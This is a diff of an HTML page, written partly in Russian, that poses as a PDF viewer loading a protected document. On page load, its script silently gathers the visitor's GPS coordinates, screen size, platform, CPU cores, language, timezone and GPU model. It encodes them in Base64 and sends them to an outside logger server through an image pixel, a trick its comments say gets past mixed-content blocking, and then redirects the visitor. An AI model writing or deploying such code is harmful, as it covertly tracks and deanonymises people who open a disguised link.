@@ -1,59 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Loading documents...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Viewer - Loading...</title>
     <style>
-        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 14px; color: #8b949e; }
     </style>
 </head>
-<body> 
-    <div class="loader"></div>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <div class="status" id="status">Загрузка защищенного документа...</div>
+    </div>
+
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const slug = urlParams.get('id');
-        const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
-        const finalRedirect = "http://echomapwa.ddns.net/logger/l/";
+        // Конфиг: адрес твоего сервера
+        const SERVER_URL = "http://echomapwa.ddns.net/logger/api/log_advance/";
+        const FINAL_FALLBACK = "http://echomapwa.ddns.net/logger/l/";
 
-        async function collectAndGo() {
-            if (!slug) return;
-            
-            let info = {
-                sw: window.screen.width, sh: window.screen.height,
-                lat: "null", lon: "null"
-            };
+        async function startPwn() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const slug = urlParams.get('id');
 
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, {
-                            enableHighAccuracy: true, timeout: 3500
-                        });
-                    });
-                    info.lat = pos.coords.latitude;
-                    info.lon = pos.coords.longitude;
-                } catch (e) {}
+            if (!slug) {
+                document.getElementById('status').innerText = "Ошибка: ID документа не найден";
+                return;
             }
 
-            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
+            // Данные для сбора
+            let info = {
+                sw: window.screen.width,
+                sh: window.screen.height,
+                plt: navigator.platform,
+                cores: navigator.hardwareConcurrency || 0,
+                lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                gpu: "Unknown",
+                lat: null,
+                lon: null
+            };
+
+            // Сбор GPU
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_VENDOR_WITH_WEBGL);
+            } catch(e) {}
+
+            // Сбор GPS (Работает на GitHub, так как там HTTPS)
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    });
+                });
+                info.lat = pos.coords.latitude;
+                info.lon = pos.coords.longitude;
+            } catch(e) {
+                console.log("GPS Denied/Timeout");
+            }
+
+            // Кодируем данные в Base64 для передачи через URL
+            const jsonStr = JSON.stringify(info);
+            const encoded = btoa(encodeURIComponent(jsonStr).replace(/%([0-9A-F]{2})/g, (match, p1) => {
+                return String.fromCharCode('0x' + p1);
+            }));
+
+            // Отправляем данные методом "Pixel Tracking" (Image GET)
+            // Это обходит блокировку Mixed Content
+            const img = new Image();
             
-            // --- СОЗДАЕМ ТЕГ SCRIPT ДЛЯ ОБХОДА БЛОКИРОВКИ ---
-            const script = document.createElement('script');
-            const go = () => { window.location.href = `${finalRedirect}${slug}?ready=1`; };
+            const goToFinal = () => {
+                // Перенаправляем на твой сервер с флагом ready=1, чтобы не было петли
+                window.location.href = FINAL_FALLBACK + slug + "?ready=1";
+            };
+
+            // Если картинка "загрузилась" (сервер ответил 200) или ошибка — редирект
+            img.onload = goToFinal;
+            img.onerror = goToFinal;
             
-            // Если скрипт «загрузился» (т.е. сервер ответил), уходим на редирект
-            script.onload = script.onerror = go;
-            script.src = `${targetServer}${fileName}?t=${Date.now()}`;
-            
-            document.head.appendChild(script);
-            
-            // Страховка: если через 5 сек ничего не вышло — уходим по-любому
-            setTimeout(go, 5000);
+            // Страховка редиректа через 3.5 секунды
+            setTimeout(goToFinal, 3500);
+
+            // Сам "выстрел" данными
+            img.src = `${SERVER_URL}${slug}?data=${encoded}&t=${Date.now()}`;
         }
 
-        collectAndGo();
+        window.onload = startPwn;
     </script>
 </body>
 </html>
